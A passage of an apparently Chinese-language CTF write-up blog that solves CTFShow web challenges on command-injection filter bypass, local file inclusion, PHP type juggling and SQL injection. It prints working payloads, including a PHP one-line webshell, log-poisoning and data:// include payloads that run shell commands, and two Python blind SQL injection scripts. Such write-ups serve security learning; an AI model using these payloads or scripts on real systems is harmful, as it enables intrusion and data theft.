+<p>然后传文件，并添加sh命令，有时候并不会执行成功，因为最后一位不一定一直是大写字母，多试几次<br><code>/?c=.%20/???/????????[@-[]</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.xqklo38zuce.png" alt="result_ls"></p>
+<p>接着读取flag即可</p>
+<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不懂，上payload：<code>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201105182344281.png#pic_center"><br>输出36</p>
+<blockquote>
+<p>原理<br><code>$&#123;_&#125; =&quot;&quot; </code> //返回上一次命令<br><code>$(($&#123;_&#125;))=0</code><br><code>$((~$(($&#123;_&#125;))))=-1</code><br>然后拼接出-36在进行取反</p>
+</blockquote>
+<p>多学一招</p>
+<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//@Author: Lazzaro</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();<span class="comment">//读取缓冲区内容，不清楚缓冲区</span></span><br><span class="line">        ob_end_clean();<span class="comment">//清楚缓冲区</span></span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+<p><del>没见过这样的</del>，payload：<code>c=include(&#39;/flag.txt&#39;);exit();</code><br>试了试，不用<code>exit();</code>的话，后面会被替换为<code>???</code>之类的</p>
+<h1 id="文件包含-LFI"><a href="#文件包含-LFI" class="headerlink" title="文件包含(LFI)"></a>文件包含(LFI)</h1><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了php，可以用<code>data</code>协议执行系统函数，payload：<code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#39;cat flag.php&#39;);</code></p>
+<h2 id="web80-amp-81"><a href="#web80-amp-81" class="headerlink" title="web80&amp;81"></a>web80&amp;81</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>日志包含，bp抓包改UA头<code>&lt;?php system(&quot;ls&quot;);?&gt;</code>，接着cat或者<code>&lt;?php system(base64 fl0g.php&#39;;?)</code></p>
+<h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><blockquote>
+<p>数组绕过正则表达式<br>返回完整匹配次数（可能是0），或者如果发生错误返回FALSE</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没想到数组，那就记下来，payload：<code>?num[]=1</code></p>
+<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:<code>?cmd=%0aphp</code>（%0a就是换行or<code>\n</code>）<br>很有意思，首先要知道<code>^$</code>是匹配一段文本中每行的开始和结束位置，在看他俩的介绍</p>
+<blockquote>
+<p><code>^</code> 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置<br><code>$</code> 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置<br><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.8i160rqgpag.png" alt="i m"></p>
+</blockquote>
+<p>第一次匹配是多行（成功），第二次一行（失败），传入payload正好可以绕过</p>
+<h2 id="web90-92-93-94-95"><a href="#web90-92-93-94-95" class="headerlink" title="web90 | 92 | 93 | 94 | 95"></a>web90 | 92 | 93 | 94 | 95</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>strpos()</code> –&gt; strpos — 查找字符串首次出现的位置\</p>
+<ul>
+<li><code>strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int</code><br>返回 needle 在 haystack 中首次出现的数字位置<br><code>offset</code> –&gt; 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始(-3：从倒数第三个字符开始查找)。</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><code>intval()</code> –&gt;  获取变量的整数值(向下取整)(<code>ceil()</code>向上取整)</p>
+<ul>
+<li><code>intval ( mixed $var [, int $base = 10 ] ) : int</code><br>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</li>
+<li>Note:<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<blockquote>
+<p>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+<p>PHP很有意思的特性，大多函数总是会修剪多余的空白字符，所以只需要用八进制，并在数值前加上空格即可，payload：<code>?num= 010574</code><br>补：92Hint:<br>intval()函数如果<code>$base</code>为0则<code>$var</code>中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</p>
+<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>这题看见直接懵逼了，可怕的三目运算，其实不想记录的，纠结一下还是写上吧，算是代码混淆，吓走你哈哈哈</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;<span class="comment">//如果GET到参数就用POST得的flag参数覆盖</span></span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>中间两行GET没用，不传flag<br>payload：<code>GET: ?a=a</code> <code>POST: HTTP_FLAG=flag</code></p>
+<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));<span class="comment">//向数组里面插入随机数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;<span class="comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span></span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>in_array()</code> –&gt; 检查数组中是否存在某个值</p>
+<ul>
+<li><code>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</code><br>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较</li>
+<li><code>strict</code> 如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同<br>可以理解为不加true就是弱比较(==)，加上true就是强比较(===)</li>
+</ul>
+</blockquote>
+<p>payload：<code>GET: n=1.php</code> <code>POST: content=&lt;?php eval($_POST[1]);?&gt;</code>之后蚁剑</p>
+<h2 id="web100-101"><a href="#web100-101" class="headerlink" title="web100 | 101"></a>web100 | 101</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>预期解：</p>
+<ol>
+<li>and与&amp;&amp;的区别<br><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code><br>只需要第一个是数值即可使v0为数值<br><code>$v0=is_numeric($v1) &amp;&amp; is_numeric($v2) &amp;&amp; is_numeric($v3);</code><br>需要全部都是数值</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php">反射类</a><br>不过最简单的就是new一个类在输出，payload：<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>100非预期：<br>看到<code>eval</code>就应该想起来前面练习的RCE<del>没想起来</del>方法较多<br>payload：<br><code>?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tail ctfshow.php`;</code><br><code>?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/</code></li>
+</ol>
+<h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102 | 103"></a>web102 | 103</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1 = $_POST[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v4 = is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v4)&#123;</span><br><span class="line">    $s = substr($v2,<span class="number">2</span>);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>考点：<code>hex2bin()</code><br>大意就是找出一个经过16进制编码后一句话，其不带任何字母，再经过<code>call_user_func()</code>调用<code>hex2bin()</code>转换回去写到文件里面进行getshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>;</span><br><span class="line">$b=base64_encode($a);  <span class="comment">// PD89YGNhdCAqYDs=</span></span><br><span class="line">$c=bin2hex($b);      <span class="comment">//这里直接用去掉=的base64</span></span><br><span class="line"><span class="comment">//输出   5044383959474e6864434171594473</span></span><br></pre></td></tr></table></figure>
+<p>payload：(v2前面随便加两个数字，绕substr的)<br><code>GET: v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</code> <code>POST: v1=hex2bin</code></p>
+<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p><code>$sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code><br><del>妈的(无能狂怒)，</del> 是盲注，道行太浅一直没想到，脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        url = <span class="string">&quot;http://eaf7f762-c08b-4374-b8d1-396518d73c69.chall.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;1&#x27; and substr((select password from ctfshow_user4 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;--+&#x27;&#x27;&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#print(url+payload)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p><code> if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret)))&#123;</code>过滤了所有字符，时间盲注</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://14e03d71-0f5b-4a4d-b819-884aeb24fbe8.chall.ctf.show/api/v5.php?id=1&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">r&#x27;&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyz-&#x27;</span>:</span><br><span class="line">        <span class="comment">#开始计时</span></span><br><span class="line">        before_time = time.time()</span><br><span class="line">        payload = <span class="string">&#x27;and if(substr((select password from ctfshow_user5 where username=&quot;flag&quot;),%d,1)=&quot;%c&quot;,sleep(3),0)--+&#x27;</span>% (i,j)</span><br><span class="line">        r = requests.get(url+ payload)</span><br><span class="line">        <span class="comment">#返回时间</span></span><br><span class="line">        after_time = time.time()</span><br><span class="line">        offset = after_time - before_time</span><br><span class="line">        <span class="keyword">if</span> offset &gt; <span class="number">2.8</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="web176-179"><a href="#web176-179" class="headerlink" title="web176-179"></a>web176-179</h2><p>payload：<code>URL/api/?id=&#39;or(1)%23</code>通杀</p>
+<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>payload：<code>URL/api/?id=&#39;or(mid(username,1,1)=&#39;f&#39;)and&#39;1&#39;=&#39;1</code></p>
+<h2 id="web181-182"><a href="#web181-182" class="headerlink" title="web181 | 182"></a>web181 | 182</h2><p>sql语句：<code>$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code><br>waf：<code>preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;, $str)</code><br>通杀payload：<code>URL/api/?id=&#39;or(mid(username,1,1)=&#39;f&#39;)and&#39;1&#39;=&#39;1</code></p>
+<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>sql：<code>$sql = &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</code><br>waf：<code>preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str)</code><br>盲注，一开始用的<code>mid()</code>，数据干扰太多，用了<code>right()</code>，附上*一样的脚本，需要手动停止，没<del>懒得</del>判断嘿嘿</p>
